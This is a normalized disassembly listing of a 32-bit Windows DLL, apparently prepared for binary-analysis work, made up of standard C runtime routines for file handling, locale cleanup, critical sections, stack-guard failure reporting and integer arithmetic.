call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_1000b730
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_1000d9d0
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_10007892
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_100078b8
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_1000b7b5
push 0x14
push r--data
call sub_10009700
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
call sub_10007840
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10009745
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000da39
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b730
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000b895
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_1000b89f
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_1000aaa8
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_1000b8e8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10007892
mov [ eax ] 0x9
call sub_10007892
mov [ eax ] 0x9
call sub_10007840
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_1000b93e
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_1000b977
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
call sub_10007840
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_10007892
mov [ eax ] 0x2a
call sub_10007892
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_10007892
push 0x22
pop esi
mov [ eax ] esi
call sub_10007840
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_10005100
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_10005100
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1000bae9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000bb40
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1000bbdd
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
or eax 0xffffffff
pop ebp
retn
sub_1000bc10
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_1000bc36
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1000bc10
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
push 0x3
call sub_1000ef30
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_1000ef30
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_10005c7a
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_10006230
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_100077ee
push esi
call sub_10005a5f
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_10005c7a
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_1000edee
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_10005a5f
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_1000ee63
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_1000edee
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_1000ec82
add esp 0xc
jmp r-xdata
sub_1000bde5
push 0x3
call sub_1000ef30
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1000bc36
push 0xff
call sub_1000bc36
pop ecx
pop ecx
push 0x3
call sub_1000ef30
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1000be1e
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1000be68
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_100079a5
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1000bed6
push 0xc
push r--data
call sub_10009700
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1000bde5
push 0x1e
call sub_1000bc36
push 0xff
call sub_1000abb2
push 0x18
call sub_1000aaa8
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1000bf98
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_10007892
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_10009745
retn
push edi
call sub_100079a5
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_100079a5
pop ecx
call sub_10007892
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000bf8f
mov eax [ ebp - 0x1c ]
sub_1000bf98
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1000bed6
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1000ae2f
sub_1000bfcb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008edb
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10005100
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_100056ac
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_10007b19
pop ecx
cmp eax ebx
je r-xdata
call sub_10008ef0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_1000c0b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000bfcb
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1000c0f2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_100079a5
push [ esi + 0x8 ]
call sub_100079a5
push [ esi + 0xc ]
call sub_100079a5
push [ esi + 0x10 ]
call sub_100079a5
push [ esi + 0x14 ]
call sub_100079a5
push [ esi + 0x18 ]
call sub_100079a5
push [ esi ]
call sub_100079a5
push [ esi + 0x20 ]
call sub_100079a5
push [ esi + 0x24 ]
call sub_100079a5
push [ esi + 0x28 ]
call sub_100079a5
push [ esi + 0x2c ]
call sub_100079a5
push [ esi + 0x30 ]
call sub_100079a5
push [ esi + 0x34 ]
call sub_100079a5
push [ esi + 0x1c ]
call sub_100079a5
push [ esi + 0x38 ]
call sub_100079a5
push [ esi + 0x3c ]
call sub_100079a5
add esp 0x40
push [ esi + 0x40 ]
call sub_100079a5
push [ esi + 0x44 ]
call sub_100079a5
push [ esi + 0x48 ]
call sub_100079a5
push [ esi + 0x4c ]
call sub_100079a5
push [ esi + 0x50 ]
call sub_100079a5
push [ esi + 0x54 ]
call sub_100079a5
push [ esi + 0x58 ]
call sub_100079a5
push [ esi + 0x5c ]
call sub_100079a5
push [ esi + 0x60 ]
call sub_100079a5
push [ esi + 0x64 ]
call sub_100079a5
push [ esi + 0x68 ]
call sub_100079a5
push [ esi + 0x6c ]
call sub_100079a5
push [ esi + 0x70 ]
call sub_100079a5
push [ esi + 0x74 ]
call sub_100079a5
push [ esi + 0x78 ]
call sub_100079a5
push [ esi + 0x7c ]
call sub_100079a5
add esp 0x40
push [ esi + 0x80 ]
call sub_100079a5
push [ esi + 0x84 ]
call sub_100079a5
push [ esi + 0x88 ]
call sub_100079a5
push [ esi + 0x8c ]
call sub_100079a5
push [ esi + 0x90 ]
call sub_100079a5
push [ esi + 0x94 ]
call sub_100079a5
push [ esi + 0x98 ]
call sub_100079a5
push [ esi + 0x9c ]
call sub_100079a5
push [ esi + 0xa0 ]
call sub_100079a5
push [ esi + 0xa4 ]
call sub_100079a5
push [ esi + 0xa8 ]
call sub_100079a5
push [ esi + 0xbc ]
call sub_100079a5
push [ esi + 0xc0 ]
call sub_100079a5
push [ esi + 0xc4 ]
call sub_100079a5
push [ esi + 0xc8 ]
call sub_100079a5
push [ esi + 0xcc ]
call sub_100079a5
add esp 0x40
push [ esi + 0xd0 ]
call sub_100079a5
push [ esi + 0xb8 ]
call sub_100079a5
push [ esi + 0xd8 ]
call sub_100079a5
push [ esi + 0xdc ]
call sub_100079a5
push [ esi + 0xe0 ]
call sub_100079a5
push [ esi + 0xe4 ]
call sub_100079a5
push [ esi + 0xe8 ]
call sub_100079a5
push [ esi + 0xec ]
call sub_100079a5
push [ esi + 0xd4 ]
call sub_100079a5
push [ esi + 0xf0 ]
call sub_100079a5
push [ esi + 0xf4 ]
call sub_100079a5
push [ esi + 0xf8 ]
call sub_100079a5
push [ esi + 0xfc ]
call sub_100079a5
push [ esi + 0x100 ]
call sub_100079a5
push [ esi + 0x104 ]
call sub_100079a5
push [ esi + 0x108 ]
call sub_100079a5
add esp 0x40
push [ esi + 0x10c ]
call sub_100079a5
push [ esi + 0x110 ]
call sub_100079a5
push [ esi + 0x114 ]
call sub_100079a5
push [ esi + 0x118 ]
call sub_100079a5
push [ esi + 0x11c ]
call sub_100079a5
push [ esi + 0x120 ]
call sub_100079a5
push [ esi + 0x124 ]
call sub_100079a5
push [ esi + 0x128 ]
call sub_100079a5
push [ esi + 0x12c ]
call sub_100079a5
push [ esi + 0x130 ]
call sub_100079a5
push [ esi + 0x134 ]
call sub_100079a5
push [ esi + 0x138 ]
call sub_100079a5
push [ esi + 0x13c ]
call sub_100079a5
push [ esi + 0x140 ]
call sub_100079a5
push [ esi + 0x144 ]
call sub_100079a5
push [ esi + 0x148 ]
call sub_100079a5
add esp 0x40
push [ esi + 0x14c ]
call sub_100079a5
push [ esi + 0x150 ]
call sub_100079a5
push [ esi + 0x154 ]
call sub_100079a5
push [ esi + 0x158 ]
call sub_100079a5
push [ esi + 0x15c ]
call sub_100079a5
push [ esi + 0x160 ]
call sub_100079a5
add esp 0x18
sub_1000c469
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
push esi
call sub_100079a5
pop ecx
sub_1000c4d2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_100079a5
pop ecx
push esi
call sub_100079a5
pop ecx
sub_1000c5d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1000bbd5
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1000bbd5
pop ecx
sub_1000c6e0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1000c710
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_1000c756
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_1000c820
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_1000c860
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1000c894
push 0x10
push r--data
call sub_10009700
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_1000bf98
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c927
mov eax [ ebp - 0x1c ]
call sub_10009745
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_10005d4a
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_100079a5
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_1000c932
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
